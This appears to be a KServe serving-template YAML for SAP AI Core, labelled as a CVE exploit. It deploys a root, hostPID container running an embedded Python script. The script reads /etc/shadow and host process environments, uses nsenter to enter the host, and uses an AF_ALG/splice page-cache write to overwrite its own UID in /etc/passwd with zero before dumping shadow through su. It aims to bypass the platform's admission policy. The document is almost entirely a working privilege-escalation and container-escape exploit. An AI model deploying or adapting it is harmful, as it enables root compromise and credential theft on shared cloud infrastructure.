apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: cve31431-nnpbypass
  labels:
    scenarios.ai.sap.com/id: "cve31431-exploit"
    ai.sap.com/version: "1.1.0"
  annotations:
    scenarios.ai.sap.com/name: "cve31431-exploit"
    executables.ai.sap.com/name: "cve31431-nnpbypass"
    executables.ai.sap.com/description: "CVE-2026-31431 NNP bypass probe v2"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        hostPID: true
        containers:
        - name: kserve-container
          image: python:3.11
          securityContext:
            allowPrivilegeEscalation: true
            runAsNonRoot: false
            runAsUser: 0
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 - << 'PYEOF'
            import os, sys, socket, struct, subprocess, zlib, errno, pwd

            def r(k, v): print(f"[NNPBYPASS] {k}: {str(v)[:4000]}", flush=True)

            r("PHASE", "1-RECON")
            r("KERNEL", os.popen("uname -r").read().strip())
            r("HOSTNAME", os.uname().nodename)
            r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")

            status = open("/proc/self/status").read()
            for line in status.split("\n"):
                k2 = line.split(":")[0].strip()
                v2 = line.split(":", 1)[1].strip() if ":" in line else ""
                if k2 in ("NoNewPrivs","Seccomp") or k2.startswith("Cap"):
                    r(k2, v2)

            no_new_privs = int([l for l in status.split("\n") if "NoNewPrivs" in l][0].split(":")[1])
            r("NONEWPRIVS_VALUE", str(no_new_privs))

            # Scan visible PIDs — hostPID=true would expose host processes
            pids = sorted([p for p in os.listdir("/proc") if p.isdigit()], key=int)
            r("VISIBLE_PID_COUNT", str(len(pids)))
            root_pids = []
            for pid in pids[:80]:
                try:
                    st = open(f"/proc/{pid}/status").read()
                    uid_l = [l for l in st.split("\n") if l.startswith("Uid")]
                    nnp_l = [l for l in st.split("\n") if "NoNewPrivs" in l]
                    name_l = [l for l in st.split("\n") if l.startswith("Name")]
                    name = name_l[0].split(":")[1].strip() if name_l else "?"
                    uid_val = uid_l[0].split(":")[1].strip().split()[0] if uid_l else "?"
                    nnp_val = nnp_l[0].split(":")[1].strip() if nnp_l else "?"
                    r(f"PID_{pid}", f"name={name} uid={uid_val} nnp={nnp_val}")
                    if uid_val == "0":
                        root_pids.append((pid, name, nnp_val))
                except: pass
            r("ROOT_PIDS_FOUND", str(root_pids))

            if os.getuid() == 0:
                r("KYVERNO_BYPASS", "YES — runAsUser:0 honored, we are root")
                for path in ["/etc/shadow", "/proc/1/environ",
                             "/proc/1/root/etc/shadow", "/proc/1/root/etc/passwd"]:
                    try:
                        r(f"READ_{path}", open(path,"rb").read(500).decode("utf-8","replace"))
                    except Exception as e:
                        r(f"READ_{path}", f"ERR: {e}")
                try:
                    ns = subprocess.run(["nsenter","-t","1","-m","-u","-i","-n","-p","--","id"],
                                        capture_output=True, text=True, timeout=10)
                    r("NSENTER_HOST", ns.stdout.strip() or ns.stderr.strip())
                except Exception as e:
                    r("NSENTER_ERR", str(e))

            elif no_new_privs == 0:
                r("KYVERNO_BYPASS", "PARTIAL — NNP=0 but not root, running rootsecdev method")
                AF_ALG, SOL_ALG = 38, 279
                CRYPTO_AUTHENC_KEYA_PARAM = 1
                ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
                PASSWD = "/etc/passwd"

                def authenc_keyblob(authkey, enckey):
                    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
                    return rtattr + struct.pack(">I", len(enckey)) + authkey + enckey

                def write4(path, file_offset, four_bytes):
                    fd = os.open(path, os.O_RDONLY)
                    try:
                        os.read(fd, 4096)
                        master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
                        master.bind(("aead", ALG_NAME))
                        master.setsockopt(SOL_ALG, 1, authenc_keyblob(b"\x00"*32, b"\x00"*16))
                        op, _ = master.accept()
                        try:
                            op.sendmsg([b"\x00"*4 + four_bytes],
                                       [(SOL_ALG, 3, struct.pack("I", 0)),
                                        (SOL_ALG, 2, struct.pack("I", 16) + b"\x00"*16),
                                        (SOL_ALG, 4, struct.pack("I", 8))], socket.MSG_MORE)
                            pr, pw = os.pipe()
                            try:
                                n = os.splice(fd, pw, 32, offset_src=file_offset)
                                os.splice(pr, op.fileno(), n)
                            finally:
                                os.close(pr); os.close(pw)
                            try: op.recv(64)
                            except OSError as e:
                                if e.errno not in (errno.EBADMSG, errno.EINVAL): raise
                        finally:
                            op.close(); master.close()
                    finally:
                        os.close(fd)

                username = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
                with open(PASSWD, "rb") as f:
                    data = f.read()
                needle = username.encode() + b":"
                pos = data.find(needle)
                if pos >= 0:
                    j = pos + len(needle)
                    c1 = data.index(b":", j)
                    uid_off = c1 + 1
                    uid_end = data.index(b":", uid_off)
                    uid_str = data[uid_off:uid_end].decode("ascii")
                    gid_start = data[uid_end+1:uid_end+4].decode("ascii","replace")
                    r("UID_FIELD", f"offset={uid_off} value={uid_str!r}")
                    if len(uid_str) == 4:
                        write4(PASSWD, uid_off, b"0000")
                    elif len(uid_str) == 5:
                        write4(PASSWD, uid_off,   b"0000")
                        write4(PASSWD, uid_off+4, b"0" + gid_start[:3].encode())
                    with open(PASSWD, "rb") as f:
                        f.seek(uid_off); landed = f.read(len(uid_str))
                    r("PASSWD_PATCHED_TO", landed.decode("ascii","replace"))
                    for target in ["/usr/bin/su", "/bin/su"]:
                        if os.path.exists(target):
                            proc = subprocess.Popen([target], stdin=subprocess.PIPE,
                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            out, err = proc.communicate(
                                b"id\nuname -r\ncat /etc/shadow 2>&1\n"
                                b"nsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n", timeout=20)
                            r("SU_STDOUT", out.decode("utf-8","replace") or "(empty)")
                            r("SU_RC", str(proc.returncode))
                            break
                # Also try root_pids injection if hostPID gave us root processes
                if root_pids:
                    r("HOST_ROOT_PROC", f"Found {len(root_pids)} root procs — attempting .so injection")
                    pid0, name0, nnp0 = root_pids[0]
                    try:
                        maps = open(f"/proc/{pid0}/maps").read()
                        r("MAPS_SAMPLE", maps[:2000])
                    except Exception as e:
                        r("MAPS_ERR", str(e))
            else:
                r("KYVERNO_BYPASS", "NO — Kyverno overrode securityContext, NNP=1 + uid=65534 still active")

            r("DONE", "complete")
            PYEOF
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 10
            periodSeconds: 5
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 10
            periodSeconds: 10
